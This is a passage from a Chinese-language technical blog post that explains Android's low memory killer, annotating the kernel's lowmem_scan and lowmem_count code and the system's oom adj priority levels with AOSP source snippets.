class="title">shrinker</span> <span class="title">lowmem_shrinker</span> =</span> &#123;</span><br><span class="line">.scan_objects = lowmem_scan,</span><br><span class="line">.count_objects = lowmem_count,</span><br><span class="line">.seeks = DEFAULT_SEEKS * <span class="number">16</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="41-lowmem_scan方法"><a class="markdownIt-Anchor" href="#41-lowmem_scan方法">#</a> 4.1 lowmem_scan 方法</h4><p>当系统内存不足时会回调 lowmem_scan 方法来 kill 应用以达到释放内存的效果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">lowmem_scan</span><span class="params">(<span class="keyword">struct</span> shrinker *s, <span class="keyword">struct</span> shrink_control *sc)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tsk</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">selected</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> rem = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> tasksize;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">short</span> min_score_adj = OOM_SCORE_ADJ_MAX + <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> minfree = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> selected_tasksize = <span class="number">0</span>;</span><br><span class="line"><span class="type">short</span> selected_oom_score_adj;</span><br><span class="line"><span class="type">int</span> array_size = ARRAY_SIZE(lowmem_adj);</span><br><span class="line"><span class="type">int</span> other_free = global_page_state(NR_FREE_PAGES) - totalreserve_pages;</span><br><span class="line"><span class="type">int</span> other_file = global_page_state(NR_FILE_PAGES) -</span><br><span class="line">global_page_state(NR_SHMEM) -</span><br><span class="line">total_swapcache_pages();</span><br><span class="line">    <span class="comment">//获取数组大小</span></span><br><span class="line"><span class="keyword">if</span> (lowmem_adj_size &lt; array_size)</span><br><span class="line">array_size = lowmem_adj_size;</span><br><span class="line"><span class="keyword">if</span> (lowmem_minfree_size &lt; array_size)</span><br><span class="line">array_size = lowmem_minfree_size;</span><br><span class="line">    <span class="comment">//获取当前内存阈值对应的adj值</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; array_size; i++) &#123;</span><br><span class="line">minfree = lowmem_minfree[i];</span><br><span class="line"><span class="keyword">if</span> (other_free &lt; minfree &amp;&amp; other_file &lt; minfree) &#123;</span><br><span class="line">min_score_adj = lowmem_adj[i];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">lowmem_print(<span class="number">3</span>, <span class="string">&quot;lowmem_scan %lu, %x, ofree %d %d, ma %hd\n&quot;</span>,</span><br><span class="line">sc-&gt;nr_to_scan, sc-&gt;gfp_mask, other_free,</span><br><span class="line">other_file, min_score_adj);</span><br><span class="line">    <span class="comment">//如果当前min_score_adj为最大adj值加1，表明还剩余足够的内存，不需要进行内存释放</span></span><br><span class="line"><span class="keyword">if</span> (min_score_adj == OOM_SCORE_ADJ_MAX + <span class="number">1</span>) &#123;</span><br><span class="line">lowmem_print(<span class="number">5</span>, <span class="string">&quot;lowmem_scan %lu, %x, return 0\n&quot;</span>,</span><br><span class="line">     sc-&gt;nr_to_scan, sc-&gt;gfp_mask);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">selected_oom_score_adj = min_score_adj;</span><br><span class="line">rcu_read_lock();</span><br><span class="line">    <span class="comment">//遍历所有的进程task</span></span><br><span class="line">for_each_process(tsk) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">p</span>;</span></span><br><span class="line"><span class="type">short</span> oom_score_adj;</span><br><span class="line"><span class="keyword">if</span> (tsk-&gt;flags &amp; PF_KTHREAD)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">p = find_lock_task_mm(tsk);</span><br><span class="line"><span class="keyword">if</span> (!p)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">//如果进程已经不包含任何memory则跳过</span></span><br><span class="line"><span class="keyword">if</span> (test_tsk_thread_flag(p, TIF_MEMDIE) &amp;&amp;</span><br><span class="line">    time_before_eq(jiffies, lowmem_deathpending_timeout)) &#123;</span><br><span class="line">task_unlock(p);</span><br><span class="line">rcu_read_unlock();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">//如果当前进程的oom_score_adj比当前内存阈值的adj还小，表明当前进程不应该被杀，跳过</span></span><br><span class="line">oom_score_adj = p-&gt;signal-&gt;oom_score_adj;</span><br><span class="line"><span class="keyword">if</span> (oom_score_adj &lt; min_score_adj) &#123;</span><br><span class="line">task_unlock(p);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">//如果当前进程的oom_score_adj比当前内存阈值的adj值大，进入进程的被杀候选</span></span><br><span class="line">        <span class="comment">//首先获取当前进程的占用内存大小</span></span><br><span class="line">tasksize = get_mm_rss(p-&gt;mm);</span><br><span class="line">task_unlock(p);</span><br><span class="line"><span class="keyword">if</span> (tasksize &lt;= <span class="number">0</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">//如果已经有进程被选为被杀进程</span></span><br><span class="line"><span class="keyword">if</span> (selected) &#123;</span><br><span class="line">            <span class="comment">//如果当前进程的oom_score_adj值比之前挑选的进程的oom_score_adj值小</span></span><br><span class="line">            <span class="comment">//代表当前进程重要程度比选中要杀的进程高，则跳过</span></span><br><span class="line"><span class="keyword">if</span> (oom_score_adj &lt; selected_oom_score_adj)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">            <span class="comment">//如果oom_score_adj值一样大，但是进程占用内存比选中要杀的进程小也跳过</span></span><br><span class="line"><span class="keyword">if</span> (oom_score_adj == selected_oom_score_adj &amp;&amp;</span><br><span class="line">    tasksize &lt;= selected_tasksize)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">//以上判断都不符合，表明当前进程的oom_score_adj值比挑选要杀的进程的oom_score_adj大</span></span><br><span class="line">        <span class="comment">//更新被挑选要杀的进程为当前遍历的进程，并记录相关信息后进入下一轮循环</span></span><br><span class="line">selected = p;</span><br><span class="line">selected_tasksize = tasksize;</span><br><span class="line">selected_oom_score_adj = oom_score_adj;</span><br><span class="line">lowmem_print(<span class="number">2</span>, <span class="string">&quot;select &#x27;%s&#x27; (%d), adj %hd, size %d, to kill\n&quot;</span>,</span><br><span class="line">     p-&gt;comm, p-&gt;pid, oom_score_adj, tasksize);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//如果找到需要被杀进程</span></span><br><span class="line"><span class="keyword">if</span> (selected) &#123;</span><br><span class="line">        <span class="comment">//计算能够释放的内存大小</span></span><br><span class="line"><span class="type">long</span> cache_size = other_file * (<span class="type">long</span>)(PAGE_SIZE / <span class="number">1024</span>);</span><br><span class="line"><span class="type">long</span> cache_limit = minfree * (<span class="type">long</span>)(PAGE_SIZE / <span class="number">1024</span>);</span><br><span class="line"><span class="type">long</span> <span class="built_in">free</span> = other_free * (<span class="type">long</span>)(PAGE_SIZE / <span class="number">1024</span>);</span><br><span class="line">trace_lowmemory_kill(selected, cache_size, cache_limit, <span class="built_in">free</span>);</span><br><span class="line">lowmem_print(<span class="number">1</span>, <span class="string">&quot;Killing &#x27;%s&#x27; (%d), adj %hd,\n&quot;</span> \</span><br><span class="line"><span class="string">&quot; to free %ldkB on behalf of &#x27;%s&#x27; (%d) because\n&quot;</span> \</span><br><span class="line"><span class="string">&quot; cache %ldkB is below limit %ldkB for oom_score_adj %hd\n&quot;</span> \</span><br><span class="line"><span class="string">&quot; Free memory is %ldkB above reserved\n&quot;</span>,</span><br><span class="line">     selected-&gt;comm, selected-&gt;pid,</span><br><span class="line">     selected_oom_score_adj,</span><br><span class="line">     selected_tasksize * (<span class="type">long</span>)(PAGE_SIZE / <span class="number">1024</span>),</span><br><span class="line">     current-&gt;comm, current-&gt;pid,</span><br><span class="line">     cache_size, cache_limit,</span><br><span class="line">     min_score_adj,</span><br><span class="line">     <span class="built_in">free</span>);</span><br><span class="line">lowmem_deathpending_timeout = jiffies + HZ;</span><br><span class="line">set_tsk_thread_flag(selected, TIF_MEMDIE);</span><br><span class="line">           <span class="comment">//发送SIGKILL信号到被选中进程</span></span><br><span class="line">send_sig(SIGKILL, selected, <span class="number">0</span>);</span><br><span class="line">           <span class="comment">//统计释放内存大小</span></span><br><span class="line">rem += selected_tasksize;</span><br><span class="line">&#125;</span><br><span class="line">lowmem_print(<span class="number">4</span>, <span class="string">&quot;lowmem_scan %lu, %x, return %lu\n&quot;</span>,</span><br><span class="line">     sc-&gt;nr_to_scan, sc-&gt;gfp_mask, rem);</span><br><span class="line">rcu_read_unlock();</span><br><span class="line"><span class="keyword">return</span> rem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>lowmem_scan 方法的主要思想就是首先获取当前内存剩余量，根据剩余量获取对应的 min free adj 值；接着遍历当前系统中的所有进程，从中挑选出进程的 oom adj 最大者，如果存在进程 oom adj 值相同，则挑选出其中占用内存最大的那个进程；最后向这个进程发送 SIGKILL 信息，以达到杀死该进程释放内存的效果。</p><h4 id="42-lowmem_count方法"><a class="markdownIt-Anchor" href="#42-lowmem_count方法">#</a> 4.2 lowmem_count 方法</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">lowmem_count</span><span class="params">(<span class="keyword">struct</span> shrinker *s,</span></span><br><span class="line"><span class="params">  <span class="keyword">struct</span> shrink_control *sc)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> global_page_state(NR_ACTIVE_ANON) +</span><br><span class="line">global_page_state(NR_ACTIVE_FILE) +</span><br><span class="line">global_page_state(NR_INACTIVE_ANON) +</span><br><span class="line">global_page_state(NR_INACTIVE_FILE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>lowmem_count 方法就是通过 shrinker 链表来判断 lmk 是否可用，如果可用则返回各部分占用的内存大小。</p><h3 id="5-整体流程"><a class="markdownIt-Anchor" href="#5-整体流程">#</a> 5. 整体流程</h3><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202205141648197.png" alt="image-20220514164809062"></p><h1 id="四-oom-adj算法"><a class="markdownIt-Anchor" href="#四-oom-adj算法">#</a> 四、oom adj 算法</h1><p>Android 进程在不同的时候处于不同的进程状态，也会根据重要性动态调整进程的 oom score。这样在 lmkd 中可以根据当前的内存使用情况，找到合适的 oom_score_adj，并将其 kill 以满足内存的持续使用。</p><p>下面主要分析 oom adj 算法作为 lmkd 机制的补充</p><p>Android 系统中计算各进程 adj 算法的核心方法</p><ul><li><p>updateOomAdjLocked：更新 adj，当目标进程为空或者被杀则返回 false；否则返回 true</p></li><li><p>computeOomAdjLocked：计算 adj，返回计算后 RawAdj 值</p></li><li><p>appOomAdjLocked：应用 adj，当需要杀掉目标进程则返回 false；否则返回 true</p><p>​当 Android 四大组件状态改变时会 updataOomAdjLocked () 来同步更新相应进程的 ADJ 优先级。这里需要说明一下，当同一个进程有多个决定其优先级的组件状态时，取优先级最高的 ADJ 最为最终的 ADJ。另外，进程会通过设置 maxAdj 来限定 ADJ 的上限。关于分析进程 ADJ 相关信息，常用命令如下：</p></li><li><p>dumpsys  meminfo</p></li><li><p>dumpsys activity o</p></li><li><p>dumpsys activity p</p></li></ul><h2 id="1-adj-0-的进程"><a class="markdownIt-Anchor" href="#1-adj-0-的进程">#</a> 1. ADJ &lt; 0 的进程</h2><ul><li><p>NATIVE_ADJ (-1000)：是由 init 进程 fork 出来的 Native 进程，并不受 system 管控；</p></li><li><p>SYSTEM_ADJ (-900)：是指 system_server 进程；</p></li><li><p>PERSISTENT_PROC_ADJ (-800): 是指在 AndroidManifest.xml 中声明 android:persistent=”true” 的系统 (即带有 FLAG_SYSTEM 标记) 进程，persistent 进程一般情况并不会被杀，即便被杀或者发生 Crash 系统会立即重新拉起该进程。</p></li><li><p>PERSISTENT_SERVICE_ADJ (-700)：是由 startIsolatedProcess () 方式启动的进程，或者是由 system_server 或者 persistent 进程所绑定 (并且带有 BIND_ABOVE_CLIENT 或者 BIND_IMPORTANT) 的服务进程</p></li><li><p>BACKUP_APP_ADJ (300)：执行 bindBackupAgent () 过程的进程</p></li><li><p>HEAVY_WEIGHT_APP_ADJ (400): realStartActivityLocked () 过程，当应用的 privateFlags 标识 PRIVATE_FLAG_CANT_SAVE_STATE 的进程；</p></li><li><p>HOME_APP_ADJ (600)：当类型为 ACTIVITY_TYPE_HOME 的应用，比如桌面 APP</p></li><li><p>PREVIOUS_APP_ADJ (700)：用户上一个使用的 APP 进程</p></li></ul><h3 id="11-system_adj-900"><a class="markdownIt-Anchor" href="#11-system_adj-900">#</a> 1.1 SYSTEM_ADJ(-900)</h3><p>SYSTEM_ADJ: 仅指 system_server 进程。在执行 SystemServer 的 startBootstrapServices () 过程会调用 AMS.setSystemProcess ()，将 system_server 进程的 maxAdj 设置成 SYSTEM_ADJ，源码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSystemProcess</span><span class="params">()</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="type">ApplicationInfo</span> <span class="variable">info</span> <span class="operator">=</span> mContext.getPackageManager().getApplicationInfo(</span><br><span class="line">            <span class="string">&quot;android&quot;</span>, STOCK_PM_FLAGS | MATCH_SYSTEM_ONLY);</span><br><span class="line">    mSystemThread.installSystemApplicationInfo(info, getClass().getClassLoader());</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="type">ProcessRecord</span> <span class="variable">app</span> <span class="operator">=</span> newProcessRecordLocked(info, info.processName, <span class="literal">false</span>, <span class="number">0</span>);</span><br><span class="line">        app.persistent = <span class="literal">true</span>;</span><br><span class="line">        app.pid = MY_PID;</span><br><span class="line">        app.maxAdj = ProcessList.SYSTEM_ADJ;</span><br><span class="line">        app.makeActive(mSystemThread.getApplicationThread(), mProcessStats);</span><br><span class="line">        <span class="keyword">synchronized</span> (mPidsSelfLocked) &#123;</span><br><span class="line">            mPidsSelfLocked.put(app.pid, app);</span><br><span class="line">        &#125;</span><br><span class="line">        updateLruProcessLocked(app, <span class="literal">false</span>, <span class="literal">null</span>);</span><br><span class="line">        updateOomAdjLocked();</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="12-persistent_proc_adj-800"><a class="markdownIt-Anchor" href="#12-persistent_proc_adj-800">#</a> 1.2 PERSISTENT_PROC_ADJ(-800)</h3><p>PERSISTENT_PROC_ADJ：在 AndroidManifest.xml 中申明 android:persistent=”true” 的系统 (即带有 FLAG_SYSTEM 标记) 进程，称之为 persistent 进程。对于 persistent 进程常规情况都不会被杀，一旦被杀或者发生 Crash，进程会立即重启。</p><p>场景一：newProcessRecordLocked</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> ProcessRecord <span class="title function_">newProcessRecordLocked</span><span class="params">(ApplicationInfo info, String customProcess, <span class="type">boolean</span> isolated, <span class="type">int</span> isolatedUid)</span> &#123;</span><br><span class="line">  <span class="type">String</span> <span class="variable">proc</span> <span class="operator">=</span> customProcess != <span class="literal">null</span> ? customProcess : info.processName;</span><br><span class="line">  <span class="keyword">final</span> <span class="type">int</span> <span class="variable">userId</span> <span class="operator">=</span> UserHandle.getUserId(info.uid);</span><br><span class="line">  <span class="type">int</span> <span class="variable">uid</span> <span class="operator">=</span> info.uid;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">final</span> <span class="type">ProcessRecord</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessRecord</span>(stats, info, proc, uid);</span><br><span class="line">  <span class="keyword">if</span> (!mBooted &amp;&amp; !mBooting</span><br><span class="line">          &amp;&amp; userId == UserHandle.USER_SYSTEM</span><br><span class="line">          &amp;&amp; (info.flags &amp; PERSISTENT_MASK) == PERSISTENT_MASK) &#123;</span><br><span class="line">      r.persistent = <span class="literal">true</span>;</span><br><span class="line">      r.maxAdj = ProcessList.PERSISTENT_PROC_ADJ;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (isolated &amp;&amp; isolatedUid != <span class="number">0</span>) &#123;</span><br><span class="line">      r.maxAdj = ProcessList.PERSISTENT_SERVICE_ADJ;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>场景二： addAppLocked</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> ProcessRecord <span class="title function_">addAppLocked</span><span class="params">(ApplicationInfo info, String customProcess, <span class="type">boolean</span> isolated, String abiOverride)</span> &#123;</span><br><span class="line">    ProcessRecord app;</span><br><span class="line">    <span class="keyword">if</span> (!isolated) &#123;</span><br><span class="line">        app = getProcessRecordLocked(customProcess != <span class="literal">null</span> ? customProcess : info.processName,</span><br><span class="line">                info.uid, <span class="literal">true</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        app = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (app == <span class="literal">null</span>) &#123;</span><br><span class="line">        app = newProcessRecordLocked(info, customProcess, isolated, <span class="number">0</span>);</span><br><span class="line">        updateLruProcessLocked(app, <span class="literal">false</span>, <span class="literal">null</span>);</span><br><span class="line">        updateOomAdjLocked();</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((info.flags &amp; PERSISTENT_MASK) == PERSISTENT_MASK) &#123;</span><br><span class="line">        app.persistent = <span class="literal">true</span>;</span><br><span class="line">        app.maxAdj = ProcessList.PERSISTENT_PROC_ADJ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (app.thread == <span class="literal">null</span> &amp;&amp; mPersistentStartingProcesses.indexOf(app) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        mPersistentStartingProcesses.add(app);</span><br><span class="line">        startProcessLocked(app, <span class="string">&quot;added application&quot;</span>,</span><br><span class="line">                customProcess != <span class="literal">null</span> ? customProcess : app.processName, abiOverride);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> app;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="13-persistent_service_adj-700"><a class="markdownIt-Anchor" href="#13-persistent_service_adj-700">#</a> 1.3 PERSISTENT_SERVICE_ADJ(-700)</h3><p>PERSISTENT_SERVICE_ADJ: startIsolatedProcess () 方式启动的进程，或者是由 system_server 或者 persistent 进程所绑定的服务进程。</p><p>场景一： newProcessRecordLocked</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">final ProcessRecord <span class="title function_">newProcessRecordLocked</span><span class="params">(ApplicationInfo info, String customProcess, boolean isolated, <span class="type">int</span> isolatedUid)</span> &#123;</span><br><span class="line">  String proc = customProcess != null ? customProcess : info.processName;</span><br><span class="line">  final <span class="type">int</span> userId = UserHandle.getUserId(info.uid);</span><br><span class="line">  <span class="type">int</span> uid = info.uid;</span><br><span class="line">  ...</span><br><span class="line">  final ProcessRecord r = new ProcessRecord(stats, info, proc, uid);</span><br><span class="line">  <span class="keyword">if</span> (!mBooted &amp;&amp; !mBooting</span><br><span class="line">          &amp;&amp; userId == UserHandle.USER_SYSTEM</span><br><span class="line">          &amp;&amp; (info.flags &amp; PERSISTENT_MASK) == PERSISTENT_MASK) &#123;</span><br><span class="line">      r.persistent = <span class="literal">true</span>;</span><br><span class="line">      r.maxAdj = ProcessList.PERSISTENT_PROC_ADJ;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (isolated &amp;&amp; isolatedUid != <span class="number">0</span>) &#123; <span class="comment">//startIsolatedProcess</span></span><br><span class="line">      r.maxAdj = ProcessList.PERSISTENT_SERVICE_ADJ;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用链如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">startOtherServices</span><br><span class="line">  WebViewUpdateService.prepareWebViewInSystemServer</span><br><span class="line">    WebViewUpdateServiceImpl.prepareWebViewInSystemServer</span><br><span class="line">      WebViewUpdater.prepareWebViewInSystemServer</span><br><span class="line">        WebViewUpdater.onWebViewProviderChanged</span><br><span class="line">          SystemImpl.onWebViewProviderChanged</span><br><span class="line">            WebViewFactory.onWebViewProviderChanged</span><br><span class="line">              WebViewLibraryLoader.prepareNativeLibraries</span><br><span class="line">                WebViewLibraryLoader.createRelros</span><br><span class="line">                  WebViewLibraryLoader.createRelroFile</span><br><span class="line">                    AMS.startIsolatedProcess</span><br></pre></td></tr></table></figure><h3 id="14-backup_app_adl300"><a class="markdownIt-Anchor" href="#14-backup_app_adl300">#</a> 1.4 BACKUP_APP_ADL(300)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (mBackupTarget != null &amp;&amp; app == mBackupTarget.app) &#123;</span><br><span class="line">    <span class="keyword">if</span> (adj &gt; ProcessList.BACKUP_APP_ADJ) &#123;</span><br><span class="line">        adj = ProcessList.BACKUP_APP_ADJ;</span><br><span class="line">        <span class="keyword">if</span> (procState &gt; ActivityManager.PROCESS_STATE_TRANSIENT_BACKGROUND) &#123;</span><br><span class="line">            procState = ActivityManager.PROCESS_STATE_TRANSIENT_BACKGROUND;</span><br><span class="line">        &#125;</span><br><span class="line">        app.adjType = <span class="string">&quot;backup&quot;</span>;</span><br><span class="line">        app.cached = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (procState &gt; ActivityManager.PROCESS_STATE_BACKUP) &#123;</span><br><span class="line">        procState = ActivityManager.PROCESS_STATE_BACKUP;</span><br><span class="line">        app.adjType = <span class="string">&quot;backup&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>执行 bindBackupAgent () 过程，设置 mBackupTarget 值；</p></li><li><p>执行 clearPendingBackup () 或 unbindBackupAgent () 过程，置空 mBackupTarget 值；</p></li></ul><h3 id="15-heavy_weight_app_adj400"><a class="markdownIt-Anchor" href="#15-heavy_weight_app_adj400">#</a> 1.5 HEAVY_WEIGHT_APP_ADJ(400)</h3><ul><li><p>realStartActivityLocked () 过程，当应用的 privateFlags 标识 PRIVATE_FLAG_CANT_SAVE_STATE，设置 mHeavyWeightProcess 值；</p></li><li><p>finishHeavyWeightApp (), 置空 mHeavyWeightProcess 值；</p></li></ul><h3 id="16-home_app_adj600"><a class="markdownIt-Anchor" href="#16-home_app_adj600">#</a> 1.6 HOME_APP_ADJ(600)</h3><p>当类型为 ACTIVITY_TYPE_HOME 的应用启动后会设置 mHomeProcess, 比如桌面 APP</p><h3 id="17-previous_app_adj700"><a class="markdownIt-Anchor" href="#17-previous_app_adj700">#</a> 1.7 PREVIOUS_APP_ADJ(700)</h3><p>场景 1： 用户上一个使用的包含 UI 的进程，为了给用户在两个 APP 之间更好的切换体验，将上一个进程 ADJ 设置到 PREVOUS_APP_ADJ 的档次。当 activityStoppedLocked () 过程会更新上一个应用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (app == mPreviousProcess &amp;&amp; app.activities.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (adj &gt; 